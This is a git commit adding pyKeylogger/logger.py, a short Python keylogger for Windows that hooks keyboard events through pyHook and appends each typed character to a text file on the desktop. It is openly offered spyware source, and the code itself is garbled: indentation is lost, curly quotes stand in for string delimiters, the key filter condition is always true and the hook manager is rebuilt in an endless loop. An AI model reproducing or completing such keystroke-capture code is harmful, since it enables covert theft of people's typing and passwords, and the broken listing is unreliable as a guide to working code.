fcd498658c66b7fecce6ed6b642a51254a6935da
Samickz <s4mick@aol.com>
2015-02-02 16:15:58 +0100

    Create logger.py

---
+++ pyKeylogger/logger.py
@@ -0,0 +1,15 @@
+import win32api
+import sys
+import pythoncom, pyHook
+buffer = ”
+def OnKeyboardEvent(event):
+if event.Ascii != 0 or 8:
+f = open (‘C:\\Users\Samick\Desktop\keylogger.txt’, ‘a’) #store all keys on the file keylogger.txt
+keylogs = chr(event.Ascii)
+f.write(keylogs)
+f.close()
+while True:
+hm = pyHook.HookManager()
+hm.KeyDown = OnKeyboardEvent
+hm.HookKeyboard()
+pythoncom.PumpMessages()
